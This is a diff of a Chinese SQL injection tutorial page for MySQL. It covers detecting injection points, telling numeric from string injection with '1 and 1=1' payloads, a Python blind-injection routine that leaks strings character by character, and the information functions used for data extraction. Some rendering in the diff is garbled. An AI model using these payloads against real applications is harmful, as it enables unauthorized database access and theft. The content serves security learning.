-<h3 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h3><p>有的时候查询因编码问题报如下错误：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1271 (HY000): Illegal mix of collations for operation &#x27;UNION&#x27;</span><br></pre></td></tr></table></figure></div>
-<p>这时可以尝试将查询字段的编码修改为 <code>utf8mb4</code>（MySQL 中支持全 Unicode 范围的字符集）。具体转换方式为 <code>CONVERT(&lt;field&gt; USING utf8mb4)</code> 。</p>
-<h1 id="SQL-注入一般过程"><a href="#SQL-注入一般过程" class="headerlink" title="SQL 注入一般过程"></a>SQL 注入一般过程</h1><h2 id="检测注入点"><a href="#检测注入点" class="headerlink" title="检测注入点"></a>检测注入点</h2><h3 id="判断漏洞是否存在"><a href="#判断漏洞是否存在" class="headerlink" title="判断漏洞是否存在"></a>判断漏洞是否存在</h3><p>根据客户端返回的结果来判断提交的测试语句是否成功被数据库引擎执行，如果测试语句被执行了，说明存在注入漏洞。</p>
-<p>一般利用单引号（<code>&#39;</code>）或者双引号（<code>&quot;</code>）来判断是否存在漏洞，如果出现 SQL 语句错误说明有很大的可能会存在漏洞；如果是查询结果发生改变则需要根据具体漏洞类型进行检测。</p>
-<h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>判断注入类型是<strong>数字型</strong>还是<strong>字符型</strong>。字符型和数字型是针对查询内容是数字的情况来区分的。这两种类型的本质区别是后端代码在拼接 sql 语句的时候会不会将用户输入的查询内容外加引号。</p>
-<ul>
-<li>如果将用户输入的查询内容外加引号则是字符型注入。</li>
-<li>如果没有将用户输入的查询内容外加引号则是数字型注入。</li>
-</ul>
-<p>注入类型决定了在注入的过程中<strong>是否需要添加单引号来确保符号闭合</strong>。而注入类型可以通过「<strong>隐式类型转换</strong>」这种特性来判断。我们使用 <code>1 and 1=1--+</code> 和 <code>1 and 1=2--+</code>（<code>--+</code> 可以替换为 <code>%23</code>）两个 payload 进行判断，根据查询结果判断注入类型：</p>
-<ul>
-<li>如果两者结果<strong>不同</strong>则说明可能是<strong>数字型</strong>注入，查询语句如下：  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span></span><br><span class="line">user_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span></span><br><span class="line">user_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure></div></li>
-<li>如果两者结果<strong>相同</strong>则说明可能是<strong>字符型</strong>注入，查询语句如下（这里字符串都被隐式转换为数字 1）：  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span></span><br><span class="line">user_id <span class="operator">=</span> <span class="string">&#x27;1 and 1=1&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span></span><br><span class="line">user_id <span class="operator">=</span> <span class="string">&#x27;1 and 1=2&#x27;</span>;</span><br></pre></td></tr></table></figure></div></li>
-</ul>
-<h2 id="构造信息泄露原语"><a href="#构造信息泄露原语" class="headerlink" title="构造信息泄露原语"></a>构造信息泄露原语</h2><p>在泄露信息前需要先构造号信息泄露原语（可以执行任意返回一个字符串&#x2F;值 <code>SELECT</code> 语句），这样 sql 注入的利用过程会比较清晰，不容易出错。</p>
-<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><ul>
-<li><p><code>substr(string, start, length)</code>：这个函数用于截取字符串,它有以下参数:</p>
-<ul>
-<li><strong>参数</strong>：<ul>
-<li><code>string</code>：需要截取的原始字符串</li>
-<li><code>start</code>：开始位置，从 1 开始计数</li>
-<li><code>length</code>：需要截取的长度，如果不填则默认截取到字符串末尾</li>
-</ul>
-</li>
-<li><strong>返回值</strong>：<ul>
-<li>返回一个新的字符串，该字符串是原始字符串中从指定位置开始,长度为指定长度的子串。</li>
-<li>如果 <code>start</code> 超出字符串长度，则返回一个空字符串。</li>
-<li>如果 <code>length</code> 超出字符串长度，则返回从 <code>start</code> 位置到字符串末尾的子串。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><code>length(str)</code>：</p>
-<ul>
-<li><strong>功能</strong>：返回字符串 <code>str</code> 的长度，<strong>以字节为单位</strong>。</li>
-<li><strong>参数</strong>：<code>str</code> 是需要处理的字符串。</li>
-<li><strong>返回值</strong>：返回一个整数，表示字符串 <code>str</code> 的字节长度。</li>
-<li><strong>示例</strong>：<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> length(<span class="string">&#x27;Hello&#x27;</span>);     <span class="comment">-- 返回 5</span></span><br><span class="line"><span class="keyword">SELECT</span> length(<span class="string">&#x27;你好&#x27;</span>);      <span class="comment">-- 返回 6 (因为每个中文字符在 UTF-8 编码中占用 3 个字节)</span></span><br><span class="line"><span class="keyword">SELECT</span> length(<span class="string">&#x27;&#x27;</span>);          <span class="comment">-- 返回 0</span></span><br><span class="line"><span class="keyword">SELECT</span> length(<span class="number">123</span>);         <span class="comment">-- 返回 3 (123 隐式类型转换为 &quot;123&quot;)</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</li>
-<li><p><code>char_length(str)</code> 或 <code>character_length(str)</code>：</p>
-<ul>
-<li><strong>功能</strong>：返回字符串 <code>str</code> 中<strong>字符的个数</strong>，不管这些字符是单字节的还是多字节的。</li>
+<li><strong>功能</strong>：返回字符串 <code>str</code>
+中<strong>字符的个数</strong>，不管这些字符是单字节的还是多字节的。</li>
 <li><strong>参数</strong>: <code>str</code> 是需要处理的字符串。</li>
-<li><strong>返回值</strong>: 返回一个整数，表示字符串 <code>str</code> 中字符的个数。</li>
-<li><strong>示例</strong>:<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">char_length</span>(<span class="string">&#x27;Hello&#x27;</span>);     <span class="comment">-- 返回 5</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">char_length</span>(<span class="string">&#x27;你好&#x27;</span>);      <span class="comment">-- 返回 2 (因为有两个中文字符)</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">char_length</span>(<span class="string">&#x27;&#x27;</span>);          <span class="comment">-- 返回 0</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</li>
-</ul>
-<h3 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h3><p>如果是普通的注入需要构造一个泄露信息的原语 <code>get_data(query_data)</code> ：</p>
+<li><strong>返回值</strong>: 返回一个整数，表示字符串 <code>str</code>
+中字符的个数。</li>
+<li><strong>示例</strong>: <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">char_length</span>(<span class="string">&#x27;Hello&#x27;</span>);     <span class="comment">-- 返回 5</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">char_length</span>(<span class="string">&#x27;你好&#x27;</span>);      <span class="comment">-- 返回 2 (因为有两个中文字符)</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">char_length</span>(<span class="string">&#x27;&#x27;</span>);          <span class="comment">-- 返回 0</span></span><br></pre></td></tr></table></figure></div> ### 普通注入
+如果是普通的注入需要构造一个泄露信息的原语
+<code>get_data(query_data)</code> ：</li>
+<li>参数 <code>query_data</code> 是正常在数据库中查询信息所用到的 sql
+语句。</li>
+<li>返回的结果是 <code>query_data</code> 这条语句查询到的信息。 ### 盲注
+如果是盲注由于对于<strong>数字</strong>和<strong>字符串</strong>的泄露方式不同（字符串本质是泄露若干个数字即
+ASCII 码）因此需要分别构造原语：</li>
+<li>对于数字泄露需要构造 <code>get_value(query_value)</code> 原语：
 <ul>
-<li>参数 <code>query_data</code> 是正常在数据库中查询信息所用到的 sql 语句。</li>
-<li>返回的结果是 <code>query_data</code> 这条语句查询到的信息。</li>
-</ul>
-<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>如果是盲注由于对于<strong>数字</strong>和<strong>字符串</strong>的泄露方式不同（字符串本质是泄露若干个数字即 ASCII 码）因此需要分别构造原语：</p>
-<ul>
-<li>对于数字泄露需要构造 <code>get_value(query_value)</code> 原语：<ul>
-<li>参数 <code>query_data</code> 是正常在数据库中查询数字所用到的 sql 语句。</li>
+<li>参数 <code>query_data</code> 是正常在数据库中查询数字所用到的 sql
+语句。</li>
 <li>返回的结果是 <code>query_value</code> 这条语句查询到的数字。</li>
 <li>对于不同类型的盲注 <code>get_value</code> 函数的实现不同。</li>
-</ul>
-</li>
-<li>对于字符串泄露需要构造 <code>get_string(query_string)</code> 原语：<ul>
-<li>参数 <code>query_string</code> 是正常在数据库中查询字符串所用到的 sql 语句。</li>
+</ul></li>
+<li>对于字符串泄露需要构造 <code>get_string(query_string)</code> 原语：
+<ul>
+<li>参数 <code>query_string</code> 是正常在数据库中查询字符串所用到的
+sql 语句。</li>
 <li>返回的结果是 <code>query_string</code> 这条语句查询到的字符串。</li>
-<li>如果实现了 <code>get_value</code> 原语那么 <code>get_string</code> 的实现比较固定，通常实现如下：  <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_string</span>(<span class="params">query_string</span>):</span><br><span class="line">    string_len = get_value(<span class="string">f&quot;length((<span class="subst">&#123;query_string&#125;</span>))&quot;</span>)</span><br><span class="line">    res_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(string_len):</span><br><span class="line">        res_string += <span class="built_in">chr</span>(get_value(<span class="string">f&quot;ascii(substr((<span class="subst">&#123;query_string&#125;</span>),<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>,1))&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> res_string</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_string(<span class="string">&#x27;database()&#x27;</span>))</span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</li>
-</ul>
-<h2 id="泄露信息"><a href="#泄露信息" class="headerlink" title="泄露信息"></a>泄露信息</h2><h3 id="相关函数-1"><a href="#相关函数-1" class="headerlink" title="相关函数"></a>相关函数</h3><ul>
-<li><strong>系统相关函数</strong>：<ul>
-<li><code>version()</code>：<ul>
+<li>如果实现了 <code>get_value</code> 原语那么 <code>get_string</code>
+的实现比较固定，通常实现如下： <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_string</span>(<span class="params">query_string</span>):</span><br><span class="line">    string_len = get_value(<span class="string">f&quot;length((<span class="subst">&#123;query_string&#125;</span>))&quot;</span>)</span><br><span class="line">    res_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(string_len):</span><br><span class="line">        res_string += <span class="built_in">chr</span>(get_value(<span class="string">f&quot;ascii(substr((<span class="subst">&#123;query_string&#125;</span>),<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>,1))&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> res_string</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_string(<span class="string">&#x27;database()&#x27;</span>))</span><br></pre></td></tr></table></figure></div> ## 泄露信息 ###
+相关函数</li>
+</ul></li>
+<li><strong>系统相关函数</strong>：
+<ul>
+<li><code>version()</code>：
+<ul>
 <li><strong>功能</strong>：返回当前 MySQL 服务器的版本信息。</li>
-<li><strong>返回值</strong>：一个字符串，表示 MySQL 服务器的版本号。</li>
-<li><strong>示例</strong>：<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> version(); <span class="comment">-- 输出示例: &quot;8.0.28-0ubuntu0.20.04.3&quot;</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</li>
-<li><code>user()</code>：<ul>
+<li><strong>返回值</strong>：一个字符串，表示 MySQL
+服务器的版本号。</li>
+<li><strong>示例</strong>： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> version(); <span class="comment">-- 输出示例: &quot;8.0.28-0ubuntu0.20.04.3&quot;</span></span><br></pre></td></tr></table></figure></div></li>
+</ul></li>
+<li><code>user()</code>：
+<ul>
 <li><strong>功能</strong>：返回当前登录 MySQL 服务器的用户名。</li>
 <li><strong>返回值</strong>：一个字符串，表示当前数据库连接的用户名。</li>
-<li><strong>示例</strong>：<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>(); <span class="comment">-- 输出示例: &quot;root@localhost&quot;</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</li>
-<li><code>database()</code>：<ul>
+<li><strong>示例</strong>： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>(); <span class="comment">-- 输出示例: &quot;root@localhost&quot;</span></span><br></pre></td></tr></table></figure></div></li>
+</ul></li>
+<li><code>database()</code>：
+<ul>
 <li><strong>功能</strong>：返回当前正在使用的数据库名。</li>
-<li><strong>返回值</strong>：一个字符串，表示当前正在使用的数据库名。如果没有选择任何数据库，则返回 <code>NULL</code> 。</li>
-<li><strong>示例</strong>：<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USE mydb;</span><br><span class="line"><span class="keyword">SELECT</span> database(); <span class="comment">-- 输出: &quot;mydb&quot;</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</li>
-<li><code>@@datadir</code>：<ul>
+<li><strong>返回值</strong>：一个字符串，表示当前正在使用的数据库名。如果没有选择任何数据库，则返回
+<code>NULL</code> 。</li>
+<li><strong>示例</strong>： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USE mydb;</span><br><span class="line"><span class="keyword">SELECT</span> database(); <span class="comment">-- 输出: &quot;mydb&quot;</span></span><br></pre></td></tr></table></figure></div></li>
+</ul></li>
+<li><code>@@datadir</code>：
+<ul>
 <li><strong>功能</strong>：返回当前 MySQL 服务器的数据目录路径。</li>
-<li><strong>返回值</strong>：一个字符串，表示 MySQL 服务器的数据目录路径。</li>
-<li><strong>示例</strong>：<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@datadir</span>; <span class="comment">-- 输出示例: &quot;/var/lib/mysql/&quot;</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</li>
-<li><code>@@version_compile_os</code>：<ul>
-<li><strong>功能</strong>：返回 MySQL 服务器编译时使用的操作系统版本。</li>
-<li><strong>返回值</strong>：一个字符串，表示 MySQL 服务器编译时使用的操作系统版本。</li>
-<li><strong>示例</strong>：<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version_compile_os</span>; <span class="comment">-- 输出示例: &quot;debian-linux-gnu&quot;</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>字符串拼接函数</strong>：<ul>
-<li><code>concat(str1, str2, ...)</code>：<ul>
+<li><strong>返回值</strong>：一个字符串，表示 MySQL
+服务器的数据目录路径。</li>
+<li><strong>示例</strong>： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@datadir</span>; <span class="comment">-- 输出示例: &quot;/var/lib/mysql/&quot;</span></span><br></pre></td></tr></table></figure></div></li>
+</ul></li>
+<li><code>@@version_compile_os</code>：
+<ul>
+<li><strong>功能</strong>：返回 MySQL
+服务器编译时使用的操作系统版本。</li>
+<li><strong>返回值</strong>：一个字符串，表示 MySQL
+服务器编译时使用的操作系统版本。</li>
+<li><strong>示例</strong>： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version_compile_os</span>; <span class="comment">-- 输出示例: &quot;debian-linux-gnu&quot;</span></span><br></pre></td></tr></table></figure></div></li>
+</ul></li>
+</ul></li>
+<li><strong>字符串拼接函数</strong>：
+<ul>
+<li><code>concat(str1, str2, ...)</code>：
+<ul>
 <li><strong>功能</strong>：将多个字符串拼接成一个字符串，没有分隔符。</li>
 <li><strong>参数</strong>：需要拼接的一个或多个字符串。</li>
-<li><strong>返回值</strong>：返回拼接后的字符串。如果任何一个参数为 NULL ，则返回 NULL 。</li>
-<li><strong>示例</strong>：<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> concat(<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;world&#x27;</span>); <span class="comment">-- 输出: &#x27;Hello world&#x27;</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</li>
-<li><code>concat_ws(separator, str1, str2, ...)</code>：<ul>
+<li><strong>返回值</strong>：返回拼接后的字符串。如果任何一个参数为 NULL
+，则返回 NULL 。</li>
+<li><strong>示例</strong>： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> concat(<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;world&#x27;</span>); <span class="comment">-- 输出: &#x27;Hello world&#x27;</span></span><br></pre></td></tr></table></figure></div></li>
+</ul></li>
+<li><code>concat_ws(separator, str1, str2, ...)</code>：
+<ul>
 <li><strong>功能</strong>：使用指定的分隔符将多个字符串拼接成一个字符串。</li>
 <li><strong>参数</strong>：第一个参数是分隔符，后面的参数是需要拼接的字符串。</li>
-<li><strong>返回值</strong>：返回拼接后的字符串。如果第一个参数为 NULL ，则函数将忽略它并与 <code>concat()</code> 等价。</li>
-<li><strong>示例</strong>：<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> concat_ws(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>, <span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>); <span class="comment">-- 输出: &#x27;Hello-world-foo-bar&#x27;</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</li>
-<li><code>group_concat(str1, str2, ...)</code>：<ul>
+<li><strong>返回值</strong>：返回拼接后的字符串。如果第一个参数为 NULL
+，则函数将忽略它并与 <code>concat()</code> 等价。</li>
+<li><strong>示例</strong>： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> concat_ws(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>, <span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>); <span class="comment">-- 输出: &#x27;Hello-world-foo-bar&#x27;</span></span><br></pre></td></tr></table></figure></div></li>
+</ul></li>
+<li><code>group_concat(str1, str2, ...)</code>：
+<ul>
 <li><strong>功能</strong>：将组内多个值连接成一个字符串。</li>
 <li><strong>参数</strong>：需要连接的字符串，具体看下面的例子。</li>
 <li><strong>返回值</strong>：返回一个字符串，包含组内所有值的连接。</li>
-<li><strong>示例</strong>：<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> group_concat(name) <span class="keyword">FROM</span> users;        <span class="comment">-- 输出: &#x27;John,Jane,Bob,Alice&#x27;</span></span><br></pre></td></tr></table></figure></div></li>
+<li><strong>示例</strong>： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> group_concat(name) <span class="keyword">FROM</span> users;        <span class="comment">-- 输出: &#x27;John,Jane,Bob,Alice&#x27;</span></span><br></pre></td></tr></table></figure></div></li>
+</ul></li>
+</ul></li>
 </ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>关于字符串拼接函数这里举一个例子。例如我们有这样一个表：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+---------+------------+-----------+</span><br><span class="line">| user_id | first_name | last_name |</span><br><span class="line">+---------+------------+-----------+</span><br><span class="line">|       1 | admin      | admin     |</span><br><span class="line">|       2 | Gordon     | Brown     |</span><br><span class="line">|       3 | Hack       | Me        |</span><br><span class="line">|       4 | Pablo      | Picasso   |</span><br><span class="line">|       5 | Bob        | Smith     |</span><br><span class="line">+---------+------------+-----------+</span><br></pre></td></tr></table></figure></div>
-<p>那么 <code>select concat(first_name, last_name) from users;</code> 命令运行结果如下，也就是说这个函数将查到的两个列拼在一起了。</p>
-<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> concat(first_name, last_name) <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"><span class="operator">|</span> concat(first_name, last_name) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"><span class="operator">|</span> adminadmin                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> GordonBrown                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HackMe                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PabloPicasso                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BobSmith                      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br></pre></td></tr></table></figure></div>
-<p>而 <code>select concat_ws(&#39;-&#39;, first_name, last_name) from users;</code> 命令同样会把查到的两个列拼在一起，不过会在不同<strong>列</strong>之间插入一个用户定义的分隔符。</p>
-<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> concat_ws(<span class="string">&#x27;-&#x27;</span>, first_name, last_name) <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> concat_ws(<span class="string">&#x27;-&#x27;</span>, first_name, last_name) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> admin<span class="operator">-</span>admin                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Gordon<span class="operator">-</span>Brown                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Hack<span class="operator">-</span>Me                               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Pablo<span class="operator">-</span>Picasso                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Bob<span class="operator">-</span>Smith                             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br></pre></td></tr></table></figure></div>
-<p><code>group_concat</code> 函数可以把整个表中查询的所有内容拼成一个字符串，在不同<strong>行</strong>之间插入 <code>,</code> 作为分隔。</p>
-<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> group_concat(first_name, last_name) <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(first_name, last_name)                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> adminadmin,GordonBrown,HackMe,PabloPicasso,BobSmith <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------+</span></span><br></pre></td></tr></table></figure></div>
-<p>我们可以把 <code>concat_ws</code> 和 <code>group_concat</code> 的特性结合起来，这样就可以确保不同表格之间的内容都有分隔。</p>
-<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> group_concat(concat_ws(<span class="string">&#x27;-&#x27;</span>, first_name, last_name)) <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(concat_ws(<span class="string">&#x27;-&#x27;</span>, first_name, last_name))      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> admin<span class="operator">-</span>admin,Gordon<span class="operator">-</span>Brown,Hack<span class="operator">-</span>Me,Pablo<span class="operator">-</span>Picasso,Bob<span class="operator">-</span>Smith <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------+</span></span><br></pre></td></tr></table></figure></div>
-<h3 id="信息泄露过程"><a href="#信息泄露过程" class="headerlink" title="信息泄露过程"></a>信息泄露过程</h3><p>根据 <code>information_schema</code> 数据库中的内容可以有如下查询顺序：<br><img  
+<p>关于字符串拼接函数这里举一个例子。例如我们有这样一个表：
